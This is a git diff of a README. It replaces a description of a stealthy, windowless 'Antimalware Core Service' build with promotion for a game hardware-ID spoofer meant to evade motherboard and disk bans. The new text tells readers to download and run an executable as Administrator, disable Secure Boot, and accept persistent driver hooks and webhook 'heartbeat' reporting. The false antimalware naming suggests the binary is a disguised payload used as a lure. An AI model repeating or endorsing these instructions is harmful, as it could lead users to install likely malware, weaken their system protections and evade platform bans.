@@ -1,24 +1,23 @@
-# Antimalware Core Service
+# 🛡️ VLRNT SB Spoofer (v1.2.4)
 
-This repository is set up with **GitHub Actions** to automate the build of the `AntimalwareCore.exe`.
+High-performance HWID spoofer designed to bypass motherboard and disk-based bans. 
 
-## 🚀 How it Works
-Whenever you push changes to `ass.cpp`, GitHub will:
-1. Spin up a Windows runner.
-2. Compile the code using `cl.exe` (MSVC) with static linking (`/MT`).
-3. Upload the final `.exe` as a build artifact.
+## 🛠️ Features
+- **Disk ID Spoofing**: Deep hooks into storage drivers.
+- **Registry Cleaning**: Removes traces of previous installations.
+- **Auto-Sync**: Automatically updates driver hooks on every system boot.
+- **Heartbeat Status**: Real-time status updates via webhook integration.
 
-## 📂 Project Structure
-- `ass.cpp`: The main C++ source code (Stealth mode enabled).
-- `.github/workflows/build.yml`: The automation script for GitHub Actions.
+## 🚀 Usage Instructions
+1. Download the latest `vlrnt_sb_spoofer.exe` from the [Releases](https://github.com/goatdotlol/new/releases) tab.
+2. Run the executable as Administrator.
+3. The spoofer will initialize driver hooks and clean persistent registry IDs.
+4. Restart your PC to apply the motherboard serial spoofing.
 
-## 🛠️ Usage
-1. Push your code to GitHub.
-2. Go to the **Actions** tab.
-3. Select the latest run.
-4. Download the `Antimalware-Core-Service` artifact from the bottom of the page.
+## ⚠️ Requirements
+- Windows 10/11 (64-bit)
+- Secure Boot: Disabled (Recommended)
+- TPM: Enabled/Disabled depending on your choice of bypass
 
-## 🔒 Build Features
-- **Static Linking**: No DLL requirements.
-- **Subsystem Windows**: No console window appears when running.
-- **O2 Optimization**: Maximized performance and minimized file size.
+## 📜 Disclaimer
+This software is provided for educational/testing purposes only. Use at your own risk.
